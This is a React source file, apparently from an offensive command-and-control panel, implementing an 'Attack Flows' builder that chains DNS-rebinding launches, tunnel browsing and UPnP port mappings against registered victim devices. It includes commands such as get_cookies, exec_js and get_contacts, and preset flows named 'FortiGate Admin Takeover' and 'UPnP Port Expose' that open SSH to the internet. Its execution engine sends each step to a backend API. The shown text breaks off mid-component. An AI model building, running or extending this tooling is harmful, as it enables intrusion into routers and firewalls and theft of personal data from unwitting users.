import React, { useState, useRef, useCallback, useEffect } from 'react';
import { apiFetch } from '../api/client.js';

// --- Constants ---

const DS = {
  bg:       '#07080f',
  surface:  '#0c0d1a',
  surface2: '#10121f',
  surface3: '#141728',
  border:   'rgba(255,255,255,0.05)',
  borderMd: 'rgba(255,255,255,0.09)',
  borderHi: 'rgba(59,130,246,0.32)',
  text:     '#c9d1e8',
  text2:    '#4e5a70',
  accent:   '#3b82f6',
  green:    '#22c55e',
  amber:    '#f59e0b',
  red:      '#ef4444',
  cyan:     '#22d3ee',
  purple:   '#a78bfa',
  mono:     "ui-monospace,'Cascadia Code','Fira Code','JetBrains Mono',monospace",
  sans:     "-apple-system,BlinkMacSystemFont,'Inter',system-ui,sans-serif",
};

const STEP_TYPES = [
  { type: 'wait',    label: 'Wait',          color: DS.text2 },
  { type: 'rebind',  label: 'Rebind Launch', color: DS.accent },
  { type: 'command', label: 'Send Command',  color: DS.amber },
  { type: 'check',   label: 'Check Result',  color: DS.purple },
  { type: 'tunnel',  label: 'Browse Tunnel', color: DS.cyan },
  { type: 'upnp',    label: 'UPnP Mapping',  color: DS.amber },
  { type: 'notify',  label: 'Notify Op',     color: DS.green },
  { type: 'stop',    label: 'Stop',          color: DS.red },
];

const TYPE_MAP = Object.fromEntries(STEP_TYPES.map(t => [t.type, t]));

const DEFAULT_CONFIGS = {
  wait:    { duration: 5 },
  rebind:  { targetIp: '', port: 80, service: 'fortigate', timeout: 30 },
  command: { commandType: 'scan', payload: '{}' },
  check:   { condition: 'contains', value: '', thenBranch: '', elseBranch: '' },
  tunnel:  { path: '/' },
  upnp:    { extPort: 22, intIp: '192.168.1.1', intPort: 22, proto: 'TCP' },
  notify:  { message: 'Step reached!' },
  stop:    {},
};

const NODE_W = 180;
const NODE_H = 58;
const NODE_SPACING = 100;

const TEMPLATES = {
  fortigate: {
    name: 'FortiGate Admin Takeover',
    nodes: [
      { id: 'n1', type: 'rebind',  x: 220, y: 60,  config: { targetIp: '192.168.1.1', port: 443, service: 'fortigate', timeout: 30 } },
      { id: 'n2', type: 'tunnel',  x: 220, y: 220, config: { path: '/api/v2/cmdb/system/admin' } },
      { id: 'n3', type: 'notify',  x: 220, y: 380, config: { message: 'FortiGate admin endpoint reached!' } },
      { id: 'n4', type: 'stop',    x: 220, y: 540, config: {} },
    ],
    edges: [
      { id: 'e1', from: 'n1', to: 'n2', condition: '' },
      { id: 'e2', from: 'n2', to: 'n3', condition: '' },
      { id: 'e3', from: 'n3', to: 'n4', condition: '' },
    ],
  },
  upnp: {
    name: 'UPnP Port Expose',
    nodes: [
      { id: 'n1', type: 'rebind',  x: 220, y: 60,  config: { targetIp: '192.168.1.1', port: 1900, service: 'generic', timeout: 30 } },
      { id: 'n2', type: 'upnp',    x: 220, y: 220, config: { extPort: 22, intIp: '192.168.1.1', intPort: 22, proto: 'TCP' } },
      { id: 'n3', type: 'notify',  x: 220, y: 380, config: { message: 'SSH exposed via UPnP!' } },
      { id: 'n4', type: 'stop',    x: 220, y: 540, config: {} },
    ],
    edges: [
      { id: 'e1', from: 'n1', to: 'n2', condition: '' },
      { id: 'e2', from: 'n2', to: 'n3', condition: '' },
      { id: 'e3', from: 'n3', to: 'n4', condition: '' },
    ],
  },
  recon: {
    name: 'Full Recon',
    nodes: [
      { id: 'n1', type: 'command', x: 220, y: 60,  config: { commandType: 'scan', payload: '{}' } },
      { id: 'n2', type: 'wait',    x: 220, y: 220, config: { duration: 30 } },
      { id: 'n3', type: 'command', x: 220, y: 380, config: { commandType: 'get_location', payload: '{}' } },
      { id: 'n4', type: 'notify',  x: 220, y: 540, config: { message: 'Recon complete - check results.' } },
      { id: 'n5', type: 'stop',    x: 220, y: 700, config: {} },
    ],
    edges: [
      { id: 'e1', from: 'n1', to: 'n2', condition: '' },
      { id: 'e2', from: 'n2', to: 'n3', condition: '' },
      { id: 'e3', from: 'n3', to: 'n4', condition: '' },
      { id: 'e4', from: 'n4', to: 'n5', condition: '' },
    ],
  },
};

// --- Helpers ---

function uid() { return 'n' + Math.random().toString(36).slice(2, 8); }
function eid() { return 'e' + Math.random().toString(36).slice(2, 8); }
function nodeCx(node) { return node.x + NODE_W / 2; }
function nodeTopCy(node) { return node.y; }
function nodeBottomCy(node) { return node.y + NODE_H; }

function buildArrowPath(fromNode, toNode) {
  const x1 = nodeCx(fromNode), y1 = nodeBottomCy(fromNode);
  const x2 = nodeCx(toNode),   y2 = nodeTopCy(toNode);
  const mid = (y1 + y2) / 2;
  return `M ${x1} ${y1} C ${x1} ${mid}, ${x2} ${mid}, ${x2} ${y2}`;
}

function clampMin(v, min) { return v < min ? min : v; }

// --- Sub-components ---

function NodeBox({ node, selected, running, onClick, onDragStart }) {
  const meta = TYPE_MAP[node.type] ?? TYPE_MAP.stop;
  const borderColor = running ? DS.green : selected ? DS.accent : meta.color;
  const glowStyle = running
    ? { boxShadow: `0 0 14px ${DS.green}55` }
    : selected
    ? { boxShadow: `0 0 10px ${meta.color}44` }
    : {};

  return (
    <foreignObject
      x={node.x} y={node.y}
      width={NODE_W} height={NODE_H}
      style={{ cursor: 'grab', overflow: 'visible' }}
      onMouseDown={e => { e.stopPropagation(); onDragStart(e, node.id); onClick(node.id); }}
    >
      <div
        xmlns="http://www.w3.org/1999/xhtml"
        style={{
          width: NODE_W, height: NODE_H,
          background: DS.surface3,
          border: `1px solid ${DS.borderMd}`,
          borderLeft: `3px solid ${borderColor}`,
          borderRadius: 8,
          display: 'flex', alignItems: 'center',
          paddingLeft: 10, paddingRight: 8, gap: 8,
          userSelect: 'none', boxSizing: 'border-box',
          ...glowStyle,
        }}
      >
        <div style={{
          width: 26, height: 26, borderRadius: 5,
          background: meta.color + '18',
          border: `1px solid ${meta.color}33`,
          display: 'flex', alignItems: 'center', justifyContent: 'center',
          fontSize: 11, flexShrink: 0, color: meta.color, fontWeight: 700,
          fontFamily: DS.mono,
        }}>
          {meta.label.charAt(0)}
        </div>
        <div style={{ minWidth: 0 }}>
          <div style={{ fontSize: 12, fontWeight: 600, color: DS.text, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{meta.label}</div>
          <div style={{ fontSize: 10, color: DS.text2, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis', fontFamily: DS.mono }}>
            {summaryText(node)}
          </div>
        </div>
      </div>
    </foreignObject>
  );
}

function summaryText(node) {
  const c = node.config ?? {};
  switch (node.type) {
    case 'wait':    return `${c.duration ?? 5}s`;
    case 'rebind':  return `${c.targetIp || '?'}:${c.port || 80}`;
    case 'command': return c.commandType || 'scan';
    case 'check':   return `${c.condition || 'contains'} "${c.value || ''}"`;
    case 'tunnel':  return c.path || '/';
    case 'upnp':    return `ext:${c.extPort} -> ${c.intIp}:${c.intPort}`;
    case 'notify':  return (c.message || '').slice(0, 24) || 'alert';
    case 'stop':    return 'terminal';
    default:        return '';
  }
}

function ConnectorDot({ node, onStartConnect }) {
  return (
    <circle
      cx={nodeCx(node)} cy={nodeBottomCy(node) + 6} r={5}
      fill={DS.surface2}
      stroke={DS.text2}
      strokeWidth={1.5}
      style={{ cursor: 'crosshair' }}
      onMouseDown={e => { e.stopPropagation(); onStartConnect(e, node.id); }}
    />
  );
}

// --- Step Editor (Right Panel) ---

function StepEditor({ node, nodes, onChange, onDelete }) {
  if (!node) {
    return (
      <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', color: DS.text2, fontSize: 13 }}>
        Select a node to edit
      </div>
    );
  }

  const meta = TYPE_MAP[node.type] ?? TYPE_MAP.stop;
  const c = node.config ?? {};
  const set = (key, val) => onChange({ ...node, config: { ...c, [key]: val } });
  const setType = (type) => onChange({ ...node, type, config: { ...DEFAULT_CONFIGS[type] } });

  const inputStyle = {
    background: DS.surface2,
    border: `1px solid ${DS.borderMd}`,
    borderRadius: 6,
    color: DS.text,
    fontSize: 13,
    padding: '7px 10px',
    width: '100%',
    boxSizing: 'border-box',
    outline: 'none',
    fontFamily: DS.sans,
  };
  const labelStyle = {
    fontSize: 10, fontWeight: 700, letterSpacing: '0.09em',
    textTransform: 'uppercase', color: DS.text2,
    marginBottom: 6, display: 'block',
  };
  const fieldWrap = { marginBottom: 14 };
  const otherNodes = nodes.filter(n => n.id !== node.id).map(n => ({ id: n.id, label: summaryText(n) || n.type }));

  return (
    <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
      <div style={{
        padding: '12px 16px',
        borderBottom: `1px solid ${DS.border}`,
        display: 'flex', alignItems: 'center', gap: 10,
      }}>
        <div style={{ width: 8, height: 8, borderRadius: '50%', background: meta.color, flexShrink: 0 }} />
        <span style={{ fontSize: 13, fontWeight: 700, color: DS.text, flex: 1 }}>{meta.label}</span>
        <button onClick={onDelete} style={{
          background: 'transparent',
          border: `1px solid rgba(239,68,68,0.3)`,
          color: DS.red,
          borderRadius: 6, padding: '4px 10px', fontSize: 11, cursor: 'pointer', fontWeight: 600, height: 26,
        }}>Delete</button>
      </div>

      <div style={{ flex: 1, overflowY: 'auto', padding: '14px 16px' }}>
        <div style={fieldWrap}>
          <label style={labelStyle}>Step Type</label>
          <select value={node.type} onChange={e => setType(e.target.value)} style={inputStyle}>
            {STEP_TYPES.map(t => <option key={t.type} value={t.type}>{t.label}</option>)}
          </select>
        </div>

        {node.type === 'wait' && (
          <div style={fieldWrap}>
            <label style={labelStyle}>Duration (seconds)</label>
            <input type="number" min={1} value={c.duration ?? 5}
              onChange={e => set('duration', Number(e.target.value))} style={inputStyle} />
          </div>
        )}

        {node.type === 'rebind' && <>
          <div style={fieldWrap}>
            <label style={labelStyle}>Target IP</label>
            <input type="text" placeholder="192.168.1.1" value={c.targetIp ?? ''}
              onChange={e => set('targetIp', e.target.value)} style={{ ...inputStyle, fontFamily: DS.mono }} />
          </div>
          <div style={fieldWrap}>
            <label style={labelStyle}>Port</label>
            <input type="number" min={1} max={65535} value={c.port ?? 80}
              onChange={e => set('port', Number(e.target.value))} style={inputStyle} />
          </div>
          <div style={fieldWrap}>
            <label style={labelStyle}>Service</label>
            <select value={c.service ?? 'fortigate'} onChange={e => set('service', e.target.value)} style={inputStyle}>
              <option value="fortigate">FortiGate</option>
              <option value="synology">Synology NAS</option>
              <option value="generic">Generic HTTP</option>
            </select>
          </div>
          <div style={fieldWrap}>
            <label style={labelStyle}>Timeout (s)</label>
            <input type="number" min={5} value={c.timeout ?? 30}
              onChange={e => set('timeout', Number(e.target.value))} style={inputStyle} />
          </div>
        </>}

        {node.type === 'command' && <>
          <div style={fieldWrap}>
            <label style={labelStyle}>Command Type</label>
            <select value={c.commandType ?? 'scan'} onChange={e => set('commandType', e.target.value)} style={inputStyle}>
              {['scan', 'get_location', 'get_permissions', 'get_cookies', 'exec_js', 'get_media', 'get_contacts', 'get_storage', 'get_network'].map(t =>
                <option key={t} value={t}>{t}</option>
              )}
            </select>
          </div>
          <div style={fieldWrap}>
            <label style={labelStyle}>Payload (JSON)</label>
            <textarea rows={4} value={c.payload ?? '{}'}
              onChange={e => set('payload', e.target.value)}
              style={{ ...inputStyle, resize: 'vertical', fontFamily: DS.mono, fontSize: 12 }} />
          </div>
        </>}

        {node.type === 'check' && <>
          <div style={fieldWrap}>
            <label style={labelStyle}>Condition</label>
            <select value={c.condition ?? 'contains'} onChange={e => set('condition', e.target.value)} style={inputStyle}>
              <option value="contains">Contains string</option>
              <option value="equals">Equals string</option>
              <option value="status_ok">Status OK (2xx)</option>
              <option value="status_fail">Status fail (non-2xx)</option>
            </select>
          </div>
          {(c.condition === 'contains' || c.condition === 'equals') && (
            <div style={fieldWrap}>
              <label style={labelStyle}>Match value</label>
              <input type="text" value={c.value ?? ''}
                onChange={e => set('value', e.target.value)} style={inputStyle} />
            </div>
          )}
          <div style={fieldWrap}>
            <label style={labelStyle}>Then (node)</label>
            <select value={c.thenBranch ?? ''} onChange={e => set('thenBranch', e.target.value)} style={inputStyle}>
              <option value="">continue default</option>
              {otherNodes.map(n => <option key={n.id} value={n.id}>{n.id}: {n.label}</option>)}
            </select>
          </div>
          <div style={fieldWrap}>
            <label style={labelStyle}>Else (node)</label>
            <select value={c.elseBranch ?? ''} onChange={e => set('elseBranch', e.target.value)} style={inputStyle}>
              <option value="">stop flow</option>
              {otherNodes.map(n => <option key={n.id} value={n.id}>{n.id}: {n.label}</option>)}
            </select>
          </div>
        </>}

        {node.type === 'tunnel' && (
          <div style={fieldWrap}>
            <label style={labelStyle}>Path</label>
            <input type="text" placeholder="/api/v2/cmdb/system/admin" value={c.path ?? '/'}
              onChange={e => set('path', e.target.value)} style={{ ...inputStyle, fontFamily: DS.mono }} />
          </div>
        )}

        {node.type === 'upnp' && <>
          <div style={fieldWrap}>
            <label style={labelStyle}>External Port</label>
            <input type="number" min={1} max={65535} value={c.extPort ?? 22}
              onChange={e => set('extPort', Number(e.target.value))} style={inputStyle} />
          </div>
          <div style={fieldWrap}>
            <label style={labelStyle}>Internal IP</label>
            <input type="text" placeholder="192.168.1.1" value={c.intIp ?? ''}
              onChange={e => set('intIp', e.target.value)} style={{ ...inputStyle, fontFamily: DS.mono }} />
          </div>
          <div style={fieldWrap}>
            <label style={labelStyle}>Internal Port</label>
            <input type="number" min={1} max={65535} value={c.intPort ?? 22}
              onChange={e => set('intPort', Number(e.target.value))} style={inputStyle} />
          </div>
          <div style={fieldWrap}>
            <label style={labelStyle}>Protocol</label>
            <select value={c.proto ?? 'TCP'} onChange={e => set('proto', e.target.value)} style={inputStyle}>
              <option value="TCP">TCP</option>
              <option value="UDP">UDP</option>
            </select>
          </div>
        </>}

        {node.type === 'notify' && (
          <div style={fieldWrap}>
            <label style={labelStyle}>Message</label>
            <textarea rows={3} value={c.message ?? ''}
              onChange={e => set('message', e.target.value)}
              style={{ ...inputStyle, resize: 'vertical' }} />
          </div>
        )}

        {node.type === 'stop' && (
          <div style={{ color: DS.text2, fontSize: 12 }}>Terminal node - flow ends here.</div>
        )}
      </div>
    </div>
  );
}

// --- Execution Engine ---

async function executeStep(node, deviceId, lastResult) {
  const c = node.config ?? {};
  switch (node.type) {
    case 'wait':
      await new Promise(r => setTimeout(r, (c.duration ?? 5) * 1000));
      return { ok: true, data: `Waited ${c.duration ?? 5}s` };

    case 'rebind': {
      const body = { target_ip: c.targetIp, port: c.port, service: c.service, timeout: c.timeout };
      const result = await apiFetch(`/api/devices/${deviceId}/rebind`, { method: 'POST', body: JSON.stringify(body) });
      return { ok: true, data: result };
    }

    case 'command': {
      let payload = {};
      try { payload = JSON.parse(c.payload || '{}'); } catch {}
      const result = await apiFetch(`/api/devices/${deviceId}/commands`, {
        method: 'POST', body: JSON.stringify({ type: c.commandType, payload }),
      });
      return { ok: true, data: result };
    }

    case 'check': {
      const text = typeof lastResult?.data === 'string'
        ? lastResult.data : JSON.stringify(lastResult?.data ?? '');
      const val = c.value ?? '';
      let match = false;
      if (c.condition === 'contains') match = text.includes(val);
      else if (c.condition === 'equals') match = text === val;
      else if (c.condition === 'status_ok') match = lastResult?.ok === true;
      else if (c.condition === 'status_fail') match = lastResult?.ok === false;
      return { ok: true, data: `Check: ${match ? 'PASS' : 'FAIL'}`, branch: match ? 'then' : 'else' };
    }

    case 'tunnel': {
      const result = await apiFetch(`/api/devices/${deviceId}/tunnel/browse`, {
        method: 'POST', body: JSON.stringify({ path: c.path }),
      });
      return { ok: true, data: result };
    }

    case 'upnp': {
      const body = { ext_port: c.extPort, int_ip: c.intIp, int_port: c.intPort, proto: c.proto };
      const result = await apiFetch(`/api/devices/${deviceId}/upnp`, { method: 'POST', body: JSON.stringify(body) });
      return { ok: true, data: result };
    }

    case 'notify': {
      if ('Notification' in window && Notification.permission === 'granted') {
        new Notification('Attack Flow', { body: c.message });
      } else if ('Notification' in window && Notification.permission !== 'denied') {
        const perm = await Notification.requestPermission();
        if (perm === 'granted') new Notification('Attack Flow', { body: c.message });
      }
      return { ok: true, data: c.message };
    }

    case 'stop':
      return { ok: true, data: 'Flow complete.' };

    default:
      return { ok: false, data: `Unknown step type: ${node.type}` };
  }
}

// --- Main Component ---

export default function AttackFlows() {
  const [nodes, setNodes] = useState([
    { id: 'n1', type: 'rebind',  x: 220, y: 60,  config: { ...DEFAULT_CONFIGS.rebind } },
    { id: 'n2', type: 'notify',  x: 220, y: 220, config: { ...DEFAULT_CONFIGS.notify } },
    { id: 'n3', type: 'stop',    x: 220, y: 380, config: {} },
  ]);
  const [edges, setEdges] = useState([
    { id: 'e1', from: 'n1', to: 'n2', condition: '' },
    { id: 'e2', from: 'n2', to: 'n3', condition: '' },
  ]);
  const [selectedId, setSelectedId] = useState(null);
  const [flowName, setFlowName] = useState('Untitled Flow');
  const [dragging, setDragging] = useState(null);
  const [connecting, setConnecting] = useState(null);
  const [devices, setDevices] = useState([]);
  const [selectedDevice, setSelectedDevice] = useState('');
  const [running, setRunning] = useState(false);
  const [paused, setPaused] = useState(false);
  const [currentNodeId, setCurrentNodeId] = useState(null);
  const [execLog, setExecLog] = useState([]);
  const [showSaved, setShowSaved] = useState(false);
  const [savedFlows, setSavedFlows] = useState([]);

  const svgRef = useRef(null);
  const pauseRef = useRef(false);
  const stopRef = useRef(false);
  const svgW = 620;
  const svgH = Math.max(700, Math.max(...nodes.map(n => n.y + NODE_H + 100)));

  useEffect(() => {
    apiFetch('/api/devices').then(data => {
      const list = Array.isArray(data) ? data : (data.devices ?? []);
      setDevices(list);
      if (list.length > 0 && !selectedDevice) setSelectedDevice(list[0].id);
    }).catch(() => {});
  }, []);

  const handleNodeDragStart = useCallback((e, nodeId) => {
    const svg = svgRef.current; if (!svg) return;
    const pt = svg.createSVGPoint();
    pt.x = e.clientX; pt.y = e.clientY;
    const svgPt = pt.matrixTransform(svg.getScreenCTM().inverse());
    const node = nodes.find(n => n.id === nodeId); if (!node) return;
    setDragging({ nodeId, offsetX: svgPt.x - node.x, offsetY: svgPt.y - node.y });
  }, [nodes]);

  const handleSvgMouseMove = useCallback((e) => {
    const svg = svgRef.current; if (!svg) return;
    const pt = svg.createSVGPoint();
    pt.x = e.clientX; pt.y = e.clientY;
    const svgPt = pt.matrixTransform(svg.getScreenCTM().inverse());
    if (dragging) {
      setNodes(prev => prev.map(n =>
        n.id === dragging.nodeId
          ? { ...n, x: clampMin(svgPt.x - dragging.offsetX, 0), y: clampMin(svgPt.y - dragging.offsetY, 0) }
          : n
      ));
    }
    if (connecting) setConnecting(prev => ({ ...prev, mouseX: svgPt.x, mouseY: svgPt.y }));
  }, [dragging, connecting]);

  const handleSvgMouseUp = useCallback((e) => {
    if (connecting) {
      const svg = svgRef.current;
      if (svg) {
        const pt = svg.createSVGPoint();
        pt.x = e.clientX; pt.y = e.clientY;
        const svgPt = pt.matrixTransform(svg.getScreenCTM().inverse());
        const target = nodes.find(n =>
          svgPt.x >= n.x && svgPt.x <= n.x + NODE_W &&
          svgPt.y >= n.y && svgPt.y <= n.y + NODE_H
        );
        if (target && target.id !== connecting.fromId) {
          const exists = edges.some(ed => ed.from === connecting.fromId && ed.to === target.id);
          if (!exists) setEdges(prev => [...prev, { id: eid(), from: connecting.fromId, to: target.id, condition: '' }]);
        }
      }
      setConnecting(null);
    }
    setDragging(null);
  }, [connecting, nodes, edges]);

  const handleConnectStart = useCallback((e, fromId) => {
    const svg = svgRef.current; if (!svg) return;
    const pt = svg.createSVGPoint();
    pt.x = e.clientX; pt.y = e.clientY;
    const svgPt = pt.matrixTransform(svg.getScreenCTM().inverse());
    setConnecting({ fromId, mouseX: svgPt.x, mouseY: svgPt.y });
  }, []);

  const addNode = () => {
    const maxY = nodes.length > 0 ? Math.max(...nodes.map(n => n.y)) : 0;
    const id = uid();
    setNodes(prev => [...prev, { id, type: 'wait', x: 220, y: maxY + NODE_H + NODE_SPACING, config: { ...DEFAULT_CONFIGS.wait } }]);
    setSelectedId(id);
  };

  const deleteSelected = () => {
    if (!selectedId) return;
    setNodes(prev => prev.filter(n => n.id !== selectedId));
    setEdges(prev => prev.filter(e => e.from !== selectedId && e.to !== selectedId));
    setSelectedId(null);
  };

  const updateNode = (updated) => setNodes(prev => prev.map(n => n.id === updated.id ? updated : n));
  const deleteEdge = (edgeId) => setEdges(prev => prev.filter(e => e.id !== edgeId));

  const addLog = (msg) => setExecLog(prev => [
    ...prev, { ts: new Date().toLocaleTimeString('en-US', { hour12: false }), msg }
  ]);

  const runFlow = async () => {
    if (!selectedDevice) { alert('Select a device first.'); return; }
    if (nodes.length === 0) { alert('Flow is empty.'); return; }
    setRunning(true); setPaused(false); setExecLog([]);
    stopRef.current = false; pauseRef.current = false;

    const nextMap = {};
    for (const n of nodes) nextMap[n.id] = edges.filter(e => e.from === n.id).map(e => e.to);
    const hasIncoming = new Set(edges.map(e => e.to));
    let current = nodes.find(n => !hasIncoming.has(n.id)) ?? nodes[0];
    let lastResult = null;
    const stepIndex = { n: 0 };

    while (current && !stopRef.current) {
      while (pauseRef.current && !stopRef.current) await new Promise(r => setTimeout(r, 200));
      if (stopRef.current) break;
      stepIndex.n++;
      setCurrentNodeId(current.id);
      addLog(`Step ${stepIndex.n} [${current.id}]: ${TYPE_MAP[current.type]?.label ?? current.type} - executing...`);
      let result;
      try {
        result = await executeStep(current, selectedDevice, lastResult);
        addLog(`  OK ${JSON.stringify(result.data ?? 'ok').slice(0, 120)}`);
      } catch (err) {
        addLog(`  ERR ${err.message}`);
        result = { ok: false, data: err.message };
      }
      lastResult = result;
      if (current.type === 'stop') break;
      const nexts = nextMap[current.id] ?? [];
      let nextId = null;
      if (current.type === 'check') {
        const branch = result.branch === 'then' ? current.config?.thenBranch : current.config?.elseBranch;
        nextId = branch || nexts[0] || null;
      } else {
        nextId = nexts[0] ?? null;
      }
      current = nextId ? nodes.find(n => n.id === nextId) : null;
      if (!current) { addLog('Flow complete - no next step.'); break; }
    }
    setCurrentNodeId(null); setRunning(false);
    addLog('--- Execution finished ---');
  };

  const pauseFlow = () => {
    pauseRef.current = !pauseRef.current;
    setPaused(p => !p);
    addLog(pauseRef.current ? 'Paused.' : 'Resumed.');
  };

  const stopFlow = () => {
    stopRef.current = true; setPaused(false); pauseRef.current = false;
    addLog('Stopped by operator.');
  };

  const saveFlow = () => {
    const name = prompt('Flow name:', flowName);
    if (!name) return;
    setFlowName(name);
    const key = 'wc_flow_' + name.replace(/[^a-zA-Z0-9_-]/g, '_');
    localStorage.setItem(key, JSON.stringify({ name, nodes, edges, savedAt: new Date().toISOString() }));
    alert(`Saved: ${name}`);
  };

  const openSaved = () => {
    const keys = Object.keys(localStorage).filter(k => k.startsWith('wc_flow_'));
    setSavedFlows(keys.map(k => {
      try { return { key: k, ...JSON.parse(localStorage.getItem(k)) }; } catch { return null; }
    }).filter(Boolean));
    setShowSaved(true);
  };

  const loadFlow = (item) => {
    setNodes(item.nodes ?? []); setEdges(item.edges ?? []);
    setFlowName(item.name ?? 'Loaded Flow');
    setSelectedId(null); setShowSaved(false);
  };

  const deleteFlow = (key) => {
    localStorage.removeItem(key);
    setSavedFlows(prev => prev.filter(f => f.key !== key));
  };

  const exportFlow = () => {
    const json = JSON.stringify({ name: flowName, nodes, edges }, null, 2);
    navigator.clipboard.writeText(json).then(() => alert('Flow JSON copied to clipboard.'));
  };

  const loadTemplate = (key) => {
    const tpl = TEMPLATES[key]; if (!tpl) return;
    setNodes(tpl.nodes.map(n => ({ ...n, config: { ...n.config } })));
    setEdges(tpl.edges.map(e => ({ ...e })));
    setFlowName(tpl.name); setSelectedId(null);
  };

  const selectedNode = nodes.find(n => n.id === selectedId) ?? null;

  const btnBase = {
    height: 30, padding: '0 12px', borderRadius: 6,
    fontSize: 12, fontWeight: 600, cursor: 'pointer', border: 'none',
    fontFamily: DS.sans,
  };
  const btnGhost = { ...btnBase, background: 'transparent', border: `1px solid ${DS.borderMd}`, color: DS.text };
  const btnPrimary = { ...btnBase, background: DS.accent, color: '#fff' };
  const btnGreen = { ...btnBase, background: 'rgba(34,197,94,0.09)', border: '1px solid rgba(34,197,94,0.25)', color: DS.green };
  const btnDanger = { ...btnBase, background: 'transparent', border: '1px solid rgba(239,68,68,0.3)', color: DS.red };
  const btnAmber = { ...btnBase, background: 'rgba(245,158,11,0.09)', border: '1px solid rgba(245,158,11,0.25)', color: DS.amber };

  return (
    <div style={{
      display: 'flex', flexDirection: 'column', height: '100vh',
      background: DS.bg, color: DS.text, fontFamily: DS.sans, overflow: 'hidden',
    }}>
      {/* Top bar */}
      <div style={{
        display: 'flex', alignItems: 'center', gap: 12, padding: '8px 16px',
        borderBottom: `1px solid ${DS.border}`, flexShrink: 0, background: DS.surface,
      }}>
        <span style={{ fontSize: 16, fontWeight: 700, color: DS.text }}>Attack Flows</span>
        <input
          value={flowName}
          onChange={e => setFlowName(e.target.value)}
          style={{
            background: 'transparent', border: `1px solid ${DS.borderMd}`, borderRadius: 6,
            color: DS.text, fontSize: 12, padding: '4px 10px', width: 180, outline: 'none',
            fontFamily: DS.sans,
          }}
        />
        <div style={{ display: 'flex', gap: 6 }}>
          {Object.keys(TEMPLATES).map(k => (
            <button key={k} onClick={() => loadTemplate(k)} style={{
              ...btnBase, background: 'transparent',
              border: `1px solid ${DS.borderHi}`, color: DS.accent,
            }}>
              {TEMPLATES[k].name.split(' ').slice(0, 2).join(' ')}
            </button>
          ))}
        </div>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: 6 }}>
          <button onClick={addNode} style={btnPrimary}>+ Step</button>
          <button onClick={saveFlow} style={btnGhost}>Save</button>
          <button onClick={openSaved} style={btnGhost}>Load</button>
          <button onClick={exportFlow} style={btnGhost}>Export</button>
        </div>
      </div>

      {/* Main area */}
      <div style={{ flex: 1, display: 'flex', overflow: 'hidden' }}>
        {/* Canvas */}
        <div style={{ flex: '0 0 60%', position: 'relative', overflow: 'auto', borderRight: `1px solid ${DS.border}` }}>
          <svg
            ref={svgRef}
            width={svgW} height={svgH}
            style={{ display: 'block', cursor: 'default', minWidth: svgW, minHeight: svgH }}
            onMouseMove={handleSvgMouseMove}
            onMouseUp={handleSvgMouseUp}
            onMouseLeave={handleSvgMouseUp}
          >
            <defs>
              <pattern id="grid" width={20} height={20} patternUnits="userSpaceOnUse">
                <circle cx={10} cy={10} r={0.6} fill="rgba(255,255,255,0.03)" />
              </pattern>
              <marker id="arrowhead" markerWidth={8} markerHeight={6} refX={7} refY={3} orient="auto">
                <polygon points="0 0, 8 3, 0 6" fill={DS.text2} />
              </marker>
              <marker id="arrowhead-active" markerWidth={8} markerHeight={6} refX={7} refY={3} orient="auto">
                <polygon points="0 0, 8 3, 0 6" fill={DS.accent} />
              </marker>
            </defs>
            <rect width="100%" height="100%" fill="url(#grid)" />

            {edges.map(edge => {
              const fromNode = nodes.find(n => n.id === edge.from);
              const toNode = nodes.find(n => n.id === edge.to);
              if (!fromNode || !toNode) return null;
              const d = buildArrowPath(fromNode, toNode);
              const isActive = currentNodeId === edge.from || currentNodeId === edge.to;
              return (
                <g key={edge.id}>
                  <path
                    d={d} fill="none"
                    stroke={isActive ? DS.accent : DS.text2}
                    strokeWidth={isActive ? 2 : 1.5}
                    markerEnd={isActive ? 'url(#arrowhead-active)' : 'url(#arrowhead)'}
                    strokeDasharray={isActive ? '6 3' : undefined}
                    opacity={isActive ? 1 : 0.5}
                  />
                  {selectedId && (() => {
                    const mx = (nodeCx(fromNode) + nodeCx(toNode)) / 2;
                    const my = (nodeBottomCy(fromNode) + nodeTopCy(toNode)) / 2;
                    return (
                      <g style={{ cursor: 'pointer' }} onClick={() => deleteEdge(edge.id)} opacity={0.7}>
                        <circle cx={mx} cy={my} r={8} fill={DS.surface3} stroke="rgba(239,68,68,0.3)" />
                        <text x={mx} y={my + 4} textAnchor="middle" fontSize={11} fill={DS.red} fontFamily="sans-serif">x</text>
                      </g>
                    );
                  })()}
                </g>
              );
            })}

            {connecting && (() => {
              const fromNode = nodes.find(n => n.id === connecting.fromId);
              if (!fromNode) return null;
              return (
                <line
                  x1={nodeCx(fromNode)} y1={nodeBottomCy(fromNode) + 6}
                  x2={connecting.mouseX} y2={connecting.mouseY}
                  stroke={DS.accent} strokeWidth={1.5}
                  strokeDasharray="5 3" markerEnd="url(#arrowhead-active)"
                />
              );
            })()}

            {nodes.map(node => (
              <g key={node.id}>
                <NodeBox
                  node={node}
                  selected={selectedId === node.id}
                  running={currentNodeId === node.id}
                  onClick={id => setSelectedId(id === selectedId ? null : id)}
                  onDragStart={handleNodeDragStart}
                />
                <ConnectorDot node={node} onStartConnect={handleConnectStart} />
                <circle cx={nodeCx(node)} cy={nodeTopCy(node) - 6} r={4}
                  fill={DS.bg} stroke={DS.text2} strokeWidth={1.5} />
                <text x={node.x + 2} y={node.y - 10} fontSize={9}
                  fill={DS.text2} fontFamily={DS.mono} opacity={0.6}>{node.id}</text>
              </g>
            ))}
          </svg>
        </div>

        {/* Right panel */}
        <div style={{ flex: '0 0 40%', display: 'flex', flexDirection: 'column', overflow: 'hidden', background: DS.surface }}>
          <StepEditor node={selectedNode} nodes={nodes} onChange={updateNode} onDelete={deleteSelected} />
        </div>
      </div>

      {/* Execution strip */}
      <div style={{ borderTop: `1px solid ${DS.border}`, padding: '10px 16px', background: DS.surface, flexShrink: 0 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 8 }}>
          <select
            value={selectedDevice}
            onChange={e => setSelectedDevice(e.target.value)}
            style={{
              background: DS.surface2, border: `1px solid ${DS.borderMd}`, borderRadius: 6,
              color: DS.text, fontSize: 12, padding: '5px 10px', outline: 'none', fontFamily: DS.sans,
            }}
          >
            {devices.length === 0 && <option value="">No devices</option>}
            {devices.map(d => <option key={d.id} value={d.id}>{d.name || d.id}</option>)}
          </select>

          {!running ? (
